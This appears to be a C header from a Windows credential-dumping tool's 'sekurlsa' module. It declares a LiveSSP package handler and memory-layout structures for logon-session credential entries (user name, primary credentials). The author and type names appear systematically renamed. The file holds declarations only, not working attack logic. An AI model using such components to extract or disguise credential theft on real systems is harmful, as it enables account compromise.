/*	paparas DELPY `gamidiaaktinidio`
	http://blog.gamidiaaktinidio.com
	paparas@gamidiaaktinidio.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_sekurlsa.h"
#if !defined(_M_ARM64)
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_package;

NTSTATUS kuhl_m_sekurlsa_livessp(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN Paktinidio_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _aktinidio_LIVESSP_PRIMARY_CREDENTIAL
{
	ULONG isSupp;
	ULONG unk0;
	aktinidio_GENERIC_PRIMARY_CREDENTIAL credentials;
} aktinidio_LIVESSP_PRIMARY_CREDENTIAL, *Paktinidio_LIVESSP_PRIMARY_CREDENTIAL;

typedef struct _aktinidio_LIVESSP_LIST_ENTRY
{
	struct _aktinidio_LIVESSP_LIST_ENTRY *Flink;
	struct _aktinidio_LIVESSP_LIST_ENTRY *Blink;
	PVOID	unk0;
	PVOID	unk1;
	PVOID	unk2;
	PVOID	unk3;
	DWORD	unk4;
	DWORD	unk5;
	PVOID	unk6;
	LUID	LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	PVOID	unk7;
	Paktinidio_LIVESSP_PRIMARY_CREDENTIAL suppCreds;
} aktinidio_LIVESSP_LIST_ENTRY, *Paktinidio_LIVESSP_LIST_ENTRY;
#endif